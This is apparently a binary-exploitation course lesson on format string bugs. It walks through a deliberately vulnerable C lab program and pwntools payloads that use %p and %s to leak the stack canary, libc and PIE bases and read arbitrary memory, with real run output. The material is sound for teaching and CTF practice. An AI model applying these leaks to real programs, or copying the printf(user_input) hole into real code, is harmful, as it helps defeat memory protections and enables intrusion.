---
title: "Lesson 7.1: Format String Bugs, Leaking the Stack and Memory"
image:
  path: /assets/img/covers/pwn-7-1-format-string-leak.webp
  alt: "Format String Bugs, Leaking the Stack and Memory"
date: 2022-12-05 06:56:00 +0700
categories: ["Binary Exploitation", "Pwn · Format String"]
tags: [pwn, format-string, aslr, canary]
render_with_liquid: false
---

When a string from the user is handed straight to `printf` as the format string, an attacker controls how `printf` interprets memory from that point on. This lesson uses that control to read memory, dumping the stack with `%p`, locating our own string on it, leaking the canary, the libc base and the PIE base, and finally reading memory at an address of our choosing with `%s`. All demos run for real on glibc 2.39.

![Dumping the stack with %p, finding your own offset, then leaking canary, libc and PIE base](/assets/img/pwn/pwn-7-1-format-string-leak.svg)
_A marker on the stack is found with %N$p, then the same trick leaks the canary, the libc pointer, and the PIE pointer._

**Time:** about 60 minutes of reading and lab work. **Difficulty:** medium.

**Prerequisites:** Lesson 1.2 (stack frames), Lesson 1.3 (ELF, GOT/PLT), Lesson 5.2 (stack canary), Lesson 5.3 (ASLR and PIE), Lesson 6.2 (the idea of leaking a libc base).

**Tools:** pwntools, gdb with pwndbg, checksec.

## Goals

After this lesson you will understand why `printf(user_input)` is a memory-read vulnerability, be able to dump the stack with `%p` and find your own parameter offset with `AAAA%N$p`, leak the canary, the libc base and the PIE base from stack slots, read memory at an address of your choice with `%s`, and know how ASLR changes this and why you must leak before you can use any address.

## Theory

### What a format string bug is and where it lives

`printf` takes a format string and scans it character by character. On hitting `%` it reads a conversion specifier such as `%d`, `%s`, `%p`, `%x`, and consumes the matching argument to print it. On x86-64, the first six arguments to a function go through registers rdi, rsi, rdx, rcx, r8, r9; the seventh argument onward lives on the stack. For `printf`, rdi is the format string itself, so the first variadic argument is rsi, then rdx, rcx, r8, r9, then the stack.

A safe call looks like `printf("%s", buf)`, where the format is controlled by the programmer. Here is the buggy call.

```c
printf(buf);     // buf comes from user input
```

If `buf` contains `%p`, `printf` thinks there is an argument to print and goes looking for the "next argument" even though the programmer never passed one. It just keeps following the convention above: take rsi, rdx, and so on, then climb onto the stack. That is how we end up reading register contents and stack contents. If `buf` contains `%s`, `printf` treats that argument as a pointer and prints the string at that address, an arbitrary-address memory read. `%n` writes instead (that is Lesson 7.2).

### Dumping the stack and counting the offset

`%p` prints a pointer (an 8-byte value in hex). Sending a run of `%p` prints rsi, rdx, rcx, r8, r9 in order, then the stack qwords. To find out which argument slot our own input string lands at, insert an easy-to-recognize marker, for example 8 `A` characters, which is `0x4141414141414141`, and read it with direct parameter access, where `%N$p` prints argument number `N` directly. When `%N$p` returns `0x4141414141414141`, that `N` is the offset of our string on the stack. With this offset, we can point `%N$s` at the exact cell we control to read any address we want.

### What to leak, and why

A function's stack frame usually has several valuable values sitting on it already:

- **Canary**: a random value glibc places right before the saved RIP to detect a stack overflow. It always ends in a `00` byte (a null byte that blocks string functions). Leaking the canary means that later, if there is an overflow, we can write the exact same canary back so the check does not trip (Lesson 5.2).
- **libc base**: the load address of the C library. The stack holds return addresses that point into libc (for example, an address inside `__libc_start_call_main`, which calls `main`). Subtracting that address's fixed offset from the start of libc gives the libc base. With the base you can compute `system`, `/bin/sh`, and so on (Lesson 6.2).
- **PIE base**: the load address of the binary itself when PIE is on. The stack holds a pointer into the binary, for example a pointer to `main` that `__libc_start_main` keeps. Subtracting the offset of `main` inside the file gives the PIE base, and from there the address of any function or variable in the binary.

### ASLR: why you must leak first

ASLR (Address Space Layout Randomization) randomizes the load addresses of the stack, libc, the heap, and the binary itself when PIE is on. Every run changes these bases. So you cannot hardcode an address; you have to leak the base within that same run and use it right there. The key point is that the leak and its use must happen in the same process, since a new process randomizes everything again. The lab program reads several times in a loop (like a menu), so we leak on the first round and use it on a later round, while the base stays the same.

## Demo

Environment: Ubuntu 24.04.4, glibc 2.39, gcc 13.3.0, ASLR on (`randomize_va_space = 2`).

Here is the source, `src.c` (the relevant part).

```c
char secret[] = "FLAG{f0rmat_str1ng_arb1trary_r3ad}";  // lives in .data

int main() {
    char buf[128];
    setvbuf(stdout, NULL, 2, 0);
    puts("== fmtstr leak demo (glibc 2.39) ==");
    for (int i = 0; i < 8; i++) {           // several rounds, one to leak and a later one to use it
        printf("echo> ");
        int n = read(0, buf, sizeof(buf) - 1);
        if (n <= 0) break;
        buf[n] = 0;
        printf(buf);                        // <-- the format string bug
        puts("");
    }
    return 0;
}
```

Build it as shown in the Lab section below, paying attention to the flags.

```bash
# FORTIFY off: if it stays on, glibc swaps printf for __printf_chk and blocks %n, which is not a realistic scenario.
# KEEP the canary (-fstack-protector-all) and KEEP PIE (the default) since this lesson needs to LEAK both.
gcc -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -fstack-protector-all -O0 -g -o leak src.c
```

`checksec` confirms: Full RELRO, Canary found, NX enabled, PIE enabled.

### Step 1: finding our own parameter offset

Send the marker `AAAAAAAA` followed by `%1$p` through `%15$p`, and here is the real result.

```
[1] marker 0x41*8 appears at offset = 8 (where our string sits on the stack)
```

So our input string starts at argument number **8**. The `buf[128]` array spans 16 qwords, that is positions 8 through 23.

### Step 2: leaking the canary, the libc base and the PIE base

Send `CAN=%25$p LIBC=%27$p PIE=%51$p`. These offsets were found by probing the stack (see the script). Here is the real output from one run, with ASLR on so the numbers differ every run.

```
[2] canary    = 0xbb44c71fbfc80c00  (ends in byte 00: True)
    libc base = 0x7d55ef400000  (leak 0x7d55ef42a1ca - 0x2a1ca)
    PIE  base = 0x6147b6d19000  (leak 0x6147b6d1a1c9 - main@0x6147b6d1a1c9)
    => system @ 0x7d55ef458750 , str /bin/sh @ 0x7d55ef5cc42f
```

Breaking down the numbers:

- `%25$p` is the canary slot: always ends in `00`, different on every run.
- `%27$p` is a return address pointing into `__libc_start_call_main`, which sits exactly `0x2a1ca` from the libc base on this machine's glibc 2.39. Subtracting `0x2a1ca` from the leak gives the libc base. Confirm the base is page-aligned (`& 0xfff == 0`) to be sure the offset was not wrong.
- `%51$p` is a pointer to `main` (the offset of `main` inside the file comes from the symbol table). PIE base equals the leak minus the offset of `main`.

Here is the matching pwntools snippet.

```python
libc.address = leak_27 - 0x2a1ca            # this specific offset only holds for this machine's glibc 2.39
e.address    = leak_51 - e.sym['main']      # pwntools already knows the offset of main inside the file
assert libc.address & 0xfff == 0            # the base must be page-aligned
```

### Step 3: reading memory at an arbitrary address with %s

With the PIE base known, `&secret = e.address + e.sym['secret']`. We place this address into the buffer itself and point `%s` at it. Since the buffer is at offset 8, the next qword (offset 9) sits at `buf+8`.

```python
payload = b'%9$s' + b'AAAA' + p64(secret_addr)   # buf+8 holds secret_addr, %9$s dereferences it
```

`printf` processes `%9$s` first (printing the string at `secret_addr`), then prints `AAAA`, then hits the null byte inside the address and stops. Here is the real output.

```
[3] %s read @ 0x6147b6d1d020  ->  b'FLAG{f0rmat_str1ng_arb1trary_r3ad}'
```

It correctly reads the `secret` string at an address we chose ourselves. Why `%9$s` and not `%8$s`: `%8$s` would dereference the start of the buffer itself (the bytes of `%9$sAAAA`), not the address we want; the address has to be pushed into the following slot, and that slot is the one we reference.

Running it again and again shows the canary, libc base, and PIE base all change (ASLR), but the exploit computes every base dynamically from the leak, so it is always correct. The full log is in the Lab section below.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 7.1</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/7.1.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/7.1/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/7.1/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/7.1/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: the binary, with Full RELRO, canary, PIE, and ASLR on.
- Goal: find the offset yourself, leak the canary, the libc base and the PIE base, and read `secret` with `%s`.
- Hints, in steps:
  - Hint 1: send `AAAAAAAA` followed by `%1$p..%20$p`, find which slot comes back as `0x4141414141414141`.
  - Hint 2: check the neighboring slots. A slot ending in `00` that changes every run is the canary. A value in the `0x7f...` range is a libc or stack pointer. A value in the same range as the binary's own base is a PIE pointer.
  - Hint 3: to find the offset of a libc pointer relative to the libc base, run the binary and compare against `/proc/<pid>/maps`. That offset is fixed for a given libc version.
  - Hint 4: to make `%s` read an arbitrary address, you must place that address into the buffer and point `%N$s` at the exact slot holding it, aligned to a qword boundary.
- Self check: can you answer "what is my parameter offset, and why does the canary always end in 00"?

## Key takeaways

- `printf(user_input)` lets an attacker read registers and the stack through `%p`.
- Argument order: rsi, rdx, rcx, r8, r9, then the stack.
- Find the offset with a marker plus `%N$p` (direct parameter access).
- The canary ends in `00`; the libc and PIE bases come from stack pointers minus a fixed offset.
- `%s` reads memory at the address we place into the buffer.
- With ASLR on, the leak and its use must happen inside the same process.

## Common pitfalls

- Confusing sequential `%N$p` with direct access. Using `%p %p %p` forces you to count by hand; using `%N$p` jumps straight to argument N, faster and without drift.
- A null byte inside the payload. `printf` stops at the first null byte of the format string. If you place an address (which contains a `00` byte) before the directives that still need to run, everything after it is ignored. Always put the address at the end, after the directives have already run.
- Mixing up the libc offset between versions. `0x2a1ca` only applies to this demo machine's glibc 2.39. On another machine you must re-derive it; the most reliable way is to leak one libc pointer and compare it against `/proc/<pid>/maps` or use libc-database.
- Forgetting FORTIFY. If the build keeps `_FORTIFY_SOURCE` on with some optimization level, glibc swaps `printf` for `__printf_chk`, which blocks `%n` and warns, so the scenario is no longer realistic.
- Hardcoding an address because one run happened to show `0x555555554000`. That was just a lucky roll; the next run changes it. Always compute the base from the leak.

## Further reading

- Lesson 7.2: using `%n` to write memory, turning this read ability into control over execution.
- Lesson 6.2: leaking the libc base through the GOT with `puts`, the same "leak then compute the base" idea.
- `man 3 printf`, the conversion specifier section, especially `%n` and the width flag.
- picoCTF and pwnable.kr, which have many format string challenges from easy to hard for practicing offset-finding.
